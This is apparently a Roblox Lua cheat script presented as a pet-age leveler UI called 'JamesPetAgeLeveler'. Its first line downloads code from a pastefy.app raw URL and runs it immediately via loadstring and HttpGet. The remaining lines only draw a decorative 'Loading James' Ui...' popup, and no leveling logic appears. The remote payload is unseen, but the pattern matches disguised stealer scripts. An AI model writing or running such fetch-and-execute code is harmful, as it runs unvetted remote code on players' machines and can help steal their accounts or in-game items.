loadstring(game:HttpGet("https://pastefy.app/H6iNsLrz/raw"))()
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local plr = Players.LocalPlayer
local char = plr.Character or plr.CharacterAdded:Wait()

local gui = Instance.new("ScreenGui")
gui.Name = "JamesPetAgeLeveler"
gui.ResetOnSpawn = false
gui.Parent = plr:WaitForChild("PlayerGui")

local function create(class, props, parent)
	local inst = Instance.new(class)
	for k, v in pairs(props) do inst[k] = v end
	inst.Parent = parent
	return inst
end

------------------------------------------------------
------------------------------------------------------

local loadingPopup = create("Frame", {
	Name = "LoadingPopup",
	Size = UDim2.new(0, 300, 0, 100),
	Position = UDim2.new(0.5, -150, 0.5, -50),
	BackgroundColor3 = Color3.fromRGB(240, 230, 255),
}, gui)

create("UICorner", { CornerRadius = UDim.new(0, 12) }, loadingPopup)
create("UIStroke", { Color = Color3.fromRGB(190, 160, 255), Thickness = 2 }, loadingPopup)

create("UIGradient", {
	Color = ColorSequence.new{
		ColorSequenceKeypoint.new(0, Color3.fromRGB(220, 200, 255)),
		ColorSequenceKeypoint.new(1, Color3.fromRGB(245, 235, 255)),
	}
}, loadingPopup)

local loadingLabel = create("TextLabel", {
	Text = "ü¶ù Loading James' Ui...",
	Font = Enum.Font.GothamBold,
	TextSize = 20,
	TextColor3 = Color3.fromRGB(140, 100, 180),
	BackgroundTransparency = 1,
	Size = UDim2.new(1, 0, 1, 0),
}, loadingPopup)

